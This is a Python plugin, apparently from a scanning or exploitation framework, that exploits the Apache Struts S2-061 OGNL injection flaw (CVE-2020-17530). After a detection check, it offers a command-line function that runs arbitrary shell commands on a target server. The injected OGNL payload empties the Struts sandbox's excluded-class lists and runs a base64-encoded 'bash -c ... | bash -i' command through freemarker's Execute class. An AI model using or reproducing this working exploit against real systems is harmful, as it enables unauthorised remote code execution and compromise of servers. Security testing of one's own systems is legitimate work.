# -*-* coding:UTF-8
import base64
import urllib.parse


class Plugin(Base):
    __info__ = {
        "name": "Struts远程代码执行漏洞",
        "version": "Apache Struts 2.0.0-2.5.25",
        "description": "Apache Struts2框架是一个用于开发Java EE网络应用程序的Web框架。Apache Struts于2020年12月08日披露 S2-061 Struts 远程代码执行漏洞（CVE-2020-17530），在使用某些tag等情况下可能存在OGNL表达式注入漏洞，从而造成远程代码执行，风险极大",
        "references": ["-"],
    }

    def url(self) -> dict:
        random_str = self.build_random_str(7)
        res = self.exec_cmd(self.target.value, f'echo {random_str}')
        if res and random_str in res:
            return {"LoopholeInfo": self.__info__}

    @cli.command(description='执行系统命令')
    @cli.options("url", help="攻击的目标", default="{self.target.url}")
    @cli.options("cmd", help="执行的命令", default="whoami")
    def exec_cmd(self, url, cmd):
        random_str = self.build_random_str(7)
        cmd = f"echo {random_str} && a=$(" + cmd + '|base64 -i|tr -d ["\n"]' + f" )&& echo $a && echo {random_str}"
        cmd = base64.b64encode(cmd.encode("utf-8")).decode()
        r = self.request(
            method='POST',
            url=urllib.parse.urljoin(url, './index.action'),
            data={"id": "%{(#instancemanager=#application[\"org.apache.tomcat.InstanceManager\"]).(#stack=#attr[\"com.opensymphony.xwork2.util.ValueStack.ValueStack\"]).(#bean=#instancemanager.newInstance(\"org.apache.commons.collections.BeanMap\")).(#bean.setBean(#stack)).(#context=#bean.get(\"context\")).(#bean.setBean(#context)).(#macc=#bean.get(\"memberAccess\")).(#bean.setBean(#macc)).(#emptyset=#instancemanager.newInstance(\"java.util.HashSet\")).(#bean.put(\"excludedClasses\",#emptyset)).(#bean.put(\"excludedPackageNames\",#emptyset)).(#arglist=#instancemanager.newInstance(\"java.util.ArrayList\")).(#arglist.add(\"bash -c {echo," + cmd + "}|{base64,-d}|{bash,-i}\")).(#execute=#instancemanager.newInstance(\"freemarker.template.utility.Execute\")).(#execute.exec(#arglist))}"},
            timeout=15,
        )
        sp = r.text.split(random_str)
        if len(sp) == 3:
            result = base64.b64decode(sp[1]).decode()
            return result
